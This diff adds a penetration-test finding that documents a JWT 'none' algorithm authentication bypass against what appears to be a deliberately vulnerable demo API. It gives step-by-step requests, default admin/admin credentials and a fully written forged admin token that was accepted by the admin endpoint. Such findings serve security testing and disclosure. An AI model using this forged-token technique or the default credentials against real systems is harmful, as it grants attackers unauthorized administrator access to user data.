@@ -1,0 +1,25 @@
+=== JWT "none" Algorithm Accepted - Authentication Bypass ===
+
+TARGET: https://duck-store.escape.tech/api/v1/admin/users
+
+PROOF:
+1. First, authenticated with valid admin credentials to confirm endpoint works:
+   POST /api/v1/auth/login with {"username":"admin","password":"admin"}
+   Response: {"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...","token_type":"bearer"}
+
+2. Used valid admin token to access /api/v1/admin/users:
+   GET /api/v1/admin/users with Authorization: Bearer <valid_admin_token>
+   Response: 200 OK with full user list (19 users including admin)
+
+3. Forged JWT with "none" algorithm:
+   Header: {"alg":"none","typ":"JWT"}
+   Payload: {"role":"admin","sub":"admin","user_id":"550e8400-e29b-41d4-a716-446655440000","username":"admin"}
+   Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4iLCJzdWIiOiJhZG1pbiIsInVzZXJfaWQiOiI1NTBlODQwMC1lMjliLTQxZDQtYTcxNi00NDY2NTU0NDAwMDAiLCJ1c2VybmFtZSI6ImFkbWluIn0.
+
+4. Used forged "none" algorithm token to access admin endpoint:
+   GET /api/v1/admin/users with Authorization: Bearer <forged_none_token>
+   Response: 200 OK with FULL admin user list (19 users)
+
+EVIDENCE: The application accepts JWT tokens signed with the "none" algorithm (alg=none), allowing an attacker to forge arbitrary tokens with any claims (including role: "admin") without knowing the signing secret. This provides full authentication bypass and privilege escalation to administrator access.
+
+The forged token with alg=none and role=admin granted full admin access to the /api/v1/admin/users endpoint.
